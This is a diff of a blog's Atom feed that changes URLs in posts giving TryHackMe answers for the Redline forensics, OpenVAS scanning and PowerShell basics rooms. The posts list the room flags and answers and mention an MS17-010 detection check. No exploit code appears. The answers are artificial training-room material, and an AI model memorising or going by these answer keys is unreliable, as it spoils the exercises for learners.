@@ -1,15 +1,15 @@
 ﻿<?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-	<id>https://blog.mark-burton.com/mywyamblog</id>
+	<id>https://blog.mark-burton.com/</id>
 	<title />
-	<link rel="self" href="https://blog.mark-burton.com/mywyamblog" />
+	<link rel="self" href="https://blog.mark-burton.com/" />
 	<rights>2023</rights>
-	<updated>2023-07-18T09:23:34Z</updated>
+	<updated>2023-07-18T21:41:39Z</updated>
 	<entry>
-		<id>https://blog.mark-burton.com/mywyamblog/posts/2023-06-24-tryhackme-redline</id>
+		<id>https://blog.mark-burton.com/posts/2023-06-24-tryhackme-redline</id>
 		<title>Try Hack Me - Redline</title>
-		<link href="https://blog.mark-burton.com/mywyamblog/posts/2023-06-24-tryhackme-redline" />
-		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/redline.jpg" />
+		<link href="https://blog.mark-burton.com/posts/2023-06-24-tryhackme-redline" />
+		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/assets/Images/redline.jpg" />
 		<updated>2023-06-24T15:23:12Z</updated>
 		<content>&lt;h2 id="redline"&gt;Redline&lt;/h2&gt;
 &lt;p&gt;This is a Try Hack Me premium room so to access it you will need a subscription, if you don't have one go get one with my &lt;a href="https://tryhackme.com/signup?referrer=638ca30a6675850049e4858e"&gt;Referral Link&lt;/a&gt;&lt;/p&gt;
@@ -20,7 +20,7 @@
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;FireEye  &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h3 id="task-2-data-collection"&gt;Task 2 - Data Collection&lt;/h3&gt;
 &lt;h4 id="question-1-1"&gt;Question 1&lt;/h4&gt;
 &lt;p&gt;What data collection method takes the least amount of time?&lt;/p&gt;
@@ -28,28 +28,28 @@
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;standard collector &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-2"&gt;Question 2&lt;/h4&gt;
 &lt;p&gt;You are reading a research paper on a new strain of ransomware. You want to run the data collection on your computer based on the patterns provided, such as domains, hashes, IP addresses, filenames, etc. What method would you choose to run a granular data collection against the known indicators?&lt;/p&gt;
 &lt;h4 id="answer-2"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;IOC Search collector &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-3"&gt;Question 3&lt;/h4&gt;
 &lt;p&gt;What script would you run to initiate the data collection process? Please include the file extension.&lt;/p&gt;
 &lt;h4 id="answer-3"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;runredlineaudit.bat &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-4"&gt;Question 4&lt;/h4&gt;
 &lt;p&gt;If you want to collect the data on Disks and Volumes, under which option can you find it?&lt;/p&gt;
 &lt;h4 id="answer-4"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;disk enumeration &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-5"&gt;Question 5&lt;/h4&gt;
 &lt;p&gt;What cache does Windows use to maintain a preference for recently executed code?&lt;/p&gt;
 &lt;h5 id="notes"&gt;Notes&lt;/h5&gt;
@@ -59,7 +59,7 @@ Cache is mentioned 13 times, there is a section dedicated to the cache which ans
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;prefetch &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h3 id="task-3-the-redline-interface"&gt;Task 3 - The Redline Interface&lt;/h3&gt;
 &lt;h4 id="question-1-2"&gt;Question 1&lt;/h4&gt;
 &lt;p&gt;Where in the Redline UI can you view information about the Logged in User?&lt;/p&gt;
@@ -67,7 +67,7 @@ Cache is mentioned 13 times, there is a section dedicated to the cache which ans
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;System Information &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h3 id="task-4-standard-collector-analysis"&gt;Task 4 - Standard Collector Analysis&lt;/h3&gt;
 &lt;h4 id="question-1-3"&gt;Question 1&lt;/h4&gt;
 &lt;p&gt;Provide the Operating System detected for the workstation.&lt;/p&gt;
@@ -80,7 +80,7 @@ I added my &lt;a href="https://tryhackme.com/forum/thread/61687020174c422766d10d
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;Windows Server 2019 Standard 17763 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-2-1"&gt;Question 2&lt;/h4&gt;
 &lt;p&gt;Be sure to check the rest of the System Information section for other useful data.&lt;/p&gt;
 &lt;h4 id="question-3-1"&gt;Question 3&lt;/h4&gt;
@@ -89,49 +89,49 @@ I added my &lt;a href="https://tryhackme.com/forum/thread/61687020174c422766d10d
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;MSOfficeUpdateFa.ke &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-4-1"&gt;Question 4&lt;/h4&gt;
 &lt;p&gt;Find the message that the intruder left for you in the task.&lt;/p&gt;
 &lt;h4 id="answer-9"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;THM-p3R5IStENCe-m3Chani$m &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-5-1"&gt;Question 5&lt;/h4&gt;
 &lt;p&gt;There is a new System Event ID created by an intruder with the source name "THM-Redline-User" and the Type "ERROR". Find the Event ID #.&lt;/p&gt;
 &lt;h4 id="answer-10"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;546 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-6"&gt;Question 6&lt;/h4&gt;
 &lt;p&gt;Provide the message for the Event ID.&lt;/p&gt;
 &lt;h4 id="answer-11"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;Someone cracked my password. Now I need to rename my puppy-++- &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-7"&gt;Question 7&lt;/h4&gt;
 &lt;p&gt;It looks like the intruder downloaded a file containing the flag for Question 8. Provide the full URL of the website.&lt;/p&gt;
 &lt;h4 id="answer-12"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;&lt;a href="https://wormhole.app/download-stream/gI9vQtChjyYAmZ8Ody0AuA"&gt;https://wormhole.app/download-stream/gI9vQtChjyYAmZ8Ody0AuA&lt;/a&gt; &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-8"&gt;Question 8&lt;/h4&gt;
 &lt;p&gt;Provide the full path to where the file was downloaded to including the filename.&lt;/p&gt;
 &lt;h4 id="answer-13"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;C:\Program Files (x86)\Windows Mail\SomeMailFolder\flag.txt &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-9"&gt;Question 9&lt;/h4&gt;
 &lt;p&gt;Provide the message the intruder left for you in the file.&lt;/p&gt;
 &lt;h4 id="answer-14"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;THM{600D-C@7cH-My-FR1EnD} &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h3 id="task-5-ioc-search-collector"&gt;Task 5 - IOC Search Collector&lt;/h3&gt;
 &lt;h4 id="question-1-4"&gt;Question 1&lt;/h4&gt;
 &lt;p&gt;What is the actual filename of the Keylogger?&lt;/p&gt;
@@ -139,28 +139,28 @@ I added my &lt;a href="https://tryhackme.com/forum/thread/61687020174c422766d10d
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;psylog.exe &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-2-2"&gt;Question 2&lt;/h4&gt;
 &lt;p&gt;What filename is the file masquerading as?&lt;/p&gt;
 &lt;h4 id="answer-16"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;thm1768.exe &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-3-2"&gt;Question 3&lt;/h4&gt;
 &lt;p&gt;Who is the owner of the file?&lt;/p&gt;
 &lt;h4 id="answer-17"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;WIN-2DET5DP0NPT\charles &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-4-2"&gt;Question 4&lt;/h4&gt;
 &lt;p&gt;What is the file size in bytes?&lt;/p&gt;
 &lt;h4 id="answer-18"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;35400 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-5-2"&gt;Question 5&lt;/h4&gt;
 &lt;p&gt;Provide the full path of where the .ioc file was placed after the Redline analysis, include the .ioc filename as well&lt;/p&gt;
 &lt;h4 id="answer-19"&gt;Answer&lt;/h4&gt;
@@ -168,15 +168,15 @@ I added my &lt;a href="https://tryhackme.com/forum/thread/61687020174c422766d10d
 &lt;p&gt;C:\Users\charles\Desktop\Keylogger-IOCSearch\IOCs\keylogger.ioc
 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 </content>
 		<summary>&lt;p&gt;This is a Try Hack Me premium room so to access it you will need a subscription, if you don't have one go get one with my &lt;a href="https://tryhackme.com/signup?referrer=638ca30a6675850049e4858e"&gt;Referral Link&lt;/a&gt;&lt;/p&gt;</summary>
 	</entry>
 	<entry>
-		<id>https://blog.mark-burton.com/mywyamblog/posts/2023-06-19-tryhackme-openvas</id>
+		<id>https://blog.mark-burton.com/posts/2023-06-19-tryhackme-openvas</id>
 		<title>Try Hack Me - OpenVAS</title>
-		<link href="https://blog.mark-burton.com/mywyamblog/posts/2023-06-19-tryhackme-openvas" />
-		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/snort.png" />
+		<link href="https://blog.mark-burton.com/posts/2023-06-19-tryhackme-openvas" />
+		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/assets/Images/snort.png" />
 		<updated>2023-06-24T15:23:12Z</updated>
 		<content>&lt;h2 id="openvas"&gt;OpenVAS&lt;/h2&gt;
 &lt;p&gt;This is a Try Hack Me premium room so to access it you will need a subscription, if you don't have one go get one with my &lt;a href="https://tryhackme.com/signup?referrer=638ca30a6675850049e4858e"&gt;Referral Link&lt;/a&gt;&lt;/p&gt;
@@ -201,57 +201,57 @@ I added my &lt;a href="https://tryhackme.com/forum/thread/61687020174c422766d10d
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;Feb 28, 00:04:46 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-2"&gt;Question 2&lt;/h4&gt;
 &lt;p&gt;When did the scan end in Case 001?&lt;/p&gt;
 &lt;h4 id="answer-1"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;Feb 28, 00:21:02 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-3"&gt;Question 3&lt;/h4&gt;
 &lt;p&gt;How many ports are open in Case 001?&lt;/p&gt;
 &lt;h4 id="answer-2"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;3 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-4"&gt;Question 4&lt;/h4&gt;
 &lt;p&gt;How many total vulnerabilities were found in Case 001?&lt;/p&gt;
 &lt;h4 id="answer-3"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;5 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-5"&gt;Question 5&lt;/h4&gt;
 &lt;p&gt;What is the highest severity vulnerability found? (MSxx-xxx)&lt;/p&gt;
 &lt;h4 id="answer-4"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;MS17-010 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-6"&gt;Question 6&lt;/h4&gt;
 &lt;p&gt;What is the first affected OS to this vulnerability?&lt;/p&gt;
 &lt;h4 id="answer-5"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;Microsoft Windows 10 x32/x64 Edition &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-7"&gt;Question 7&lt;/h4&gt;
 &lt;p&gt;What is the recommended vulnerability detection method?&lt;/p&gt;
 &lt;h4 id="answer-6"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;Send the crafted SMB transaction request with fid = 0 and check the response to confirm the vulnerability. &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 </content>
 		<summary>&lt;p&gt;This is a Try Hack Me premium room so to access it you will need a subscription, if you don't have one go get one with my &lt;a href="https://tryhackme.com/signup?referrer=638ca30a6675850049e4858e"&gt;Referral Link&lt;/a&gt;&lt;/p&gt;</summary>
 	</entry>
 	<entry>
-		<id>https://blog.mark-burton.com/mywyamblog/posts/2023-06-19-tryhackme-hacking-with-powershell</id>
+		<id>https://blog.mark-burton.com/posts/2023-06-19-tryhackme-hacking-with-powershell</id>
 		<title>Try Hack Me - Hacking with PowerShell</title>
-		<link href="https://blog.mark-burton.com/mywyamblog/posts/2023-06-19-tryhackme-hacking-with-powershell" />
-		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/snort.png" />
+		<link href="https://blog.mark-burton.com/posts/2023-06-19-tryhackme-hacking-with-powershell" />
+		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/assets/Images/snort.png" />
 		<updated>2023-06-19T15:23:12Z</updated>
 		<content>&lt;h2 id="hacking-with-powershell"&gt;Hacking with PowerShell&lt;/h2&gt;
 &lt;p&gt;This is a Try Hack Me premium room so to access it you will need a subscription, if you don't have one go get one with my &lt;a href="https://tryhackme.com/signup?referrer=638ca30a6675850049e4858e"&gt;Referral Link&lt;/a&gt;&lt;/p&gt;
@@ -272,7 +272,7 @@ Check the spelling of the name, or if a path was included, verify that the path 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;Get-New &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h3 id="task-3-basic-powershell-commands"&gt;Task 3 - Basic Powershell Commands&lt;/h3&gt;
 &lt;p&gt;&lt;a href="https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7"&gt;PowerShell verbs&lt;/a&gt;&lt;/p&gt;
 &lt;h4 id="question-1-1"&gt;Question 1&lt;/h4&gt;
@@ -292,7 +292,7 @@ Mode                LastWriteTime         Length Name
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;C:\Program Files &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-2"&gt;Question 2&lt;/h4&gt;
 &lt;p&gt;Specify the contents of this file&lt;/p&gt;
 &lt;h5 id="notes-2"&gt;Notes&lt;/h5&gt;
@@ -302,7 +302,7 @@ Mode                LastWriteTime         Length Name
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;notsointerestingcontent &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-3"&gt;Question 3&lt;/h4&gt;
 &lt;p&gt;How many cmdlets are installed on the system(only cmdlets, not functions and aliases)?&lt;/p&gt;
 &lt;h5 id="notes-3"&gt;Notes&lt;/h5&gt;
@@ -341,7 +341,7 @@ REMARKS
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;9673 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-4"&gt;Question 4&lt;/h4&gt;
 &lt;p&gt;Get the MD5 hash of interesting-file.txt&lt;/p&gt;
 &lt;h5 id="notes-4"&gt;Notes&lt;/h5&gt;
@@ -366,14 +366,14 @@ SYNTAX
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;49A586A2A9456226F8A1B4CEC6FAB329 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-5"&gt;Question 5&lt;/h4&gt;
 &lt;p&gt;What is the command to get the current working directory?&lt;/p&gt;
 &lt;h4 id="answer-5"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;Get-Location &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-6"&gt;Question 6&lt;/h4&gt;
 &lt;p&gt;Does the path "C:\Users\Administrator\Documents\Passwords" Exist (Y/N)?&lt;/p&gt;
 &lt;h5 id="notes-5"&gt;Notes&lt;/h5&gt;
@@ -384,14 +384,14 @@ True|False
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;N &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-7"&gt;Question 7&lt;/h4&gt;
 &lt;p&gt;What command would you use to make a request to a web server?&lt;/p&gt;
 &lt;h4 id="answer-7"&gt;Answer&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;Invoke-WebRequest &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-8"&gt;Question 8&lt;/h4&gt;
 &lt;p&gt;Base64 decode the file b64.txt on Windows.&lt;/p&gt;
 &lt;h5 id="notes-6"&gt;Notes&lt;/h5&gt;
@@ -410,7 +410,7 @@ the rest is garbage
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;ihopeyoudidthisonwindows &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
